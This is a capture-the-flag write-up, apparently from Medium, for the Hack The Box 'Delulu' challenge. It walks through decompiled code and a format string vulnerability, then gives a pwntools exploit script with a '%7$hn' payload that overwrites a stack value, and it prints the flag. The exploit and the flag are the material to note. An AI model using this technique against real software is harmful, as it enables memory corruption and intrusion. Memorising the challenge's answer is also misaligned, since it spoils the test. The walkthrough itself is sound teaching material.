# :game_die: HTB: Cyber Apocalypse 2024 - Delulu

---

# HTB: Cyber Apocalypse 2024 — Delulu

Difficulty: Very Easy

## Description

HALT! Recognition protocol initiated. Please present your face for scanning.

## Protection (checksec)

```
$ checksec
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
RUNPATH: b'./glibc/'
```

As we can see: All protections are enabled.

## The program’s interface

*The program’s interface*

## Get Szigecsán Dávid’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

## Disassembly (ghidra)

```
undefined8 main(void) {
long in_FS_OFFSET;
long local_48;
long *local_40;
undefined8 local_38;
undefined8 local_30;
undefined8 local_28;
undefined8 local_20;
long local_10;

local_10 = *(long *)(in_FS_OFFSET + 0x28);
local_48 = 0x1337babe;
local_40 = &local_48;
local_38 = 0;
local_30 = 0;
local_28 = 0;
local_20 = 0;
read(0,&local_38,0x1f);
printf("\\n[!] Checking.. ");
printf((char *)&local_38);
if (local_48 == 0x1337beef) {
delulu();
}
else {
error("ALERT ALERT ALERT ALERT\\n");
}
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
/* WARNING: Subroutine does not return */
__stack_chk_fail();
}
return 0;
}
```

We can notice a format string vulnerability in the following line:

```
printf((char *)&local_38);
```

To call the “win” method called `delulu()`, we need to overwrite the value in `local_48` to be `0x1337beef` instead of `0x1337babe`.

## Solution (pwntools)

```
#!/usr/bin/python3
import argparse
import pwn

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', type=str, required=False)
parser.add_argument('--port', '-p', type=str, required=False)
args = parser.parse_args()

p = pwn.remote(args.target, args.port)

p.sendlineafter('>> ', '%48879x%7$hn')
p.recvuntil('HTB')
print(f'Flag --> HTB{p.recvline().strip().decode()}\\n')
```

>> [!] Flag: HTB{m45t3r_0f_d3c3pt10n}

## Skills Learned

- format string vulnerability

---
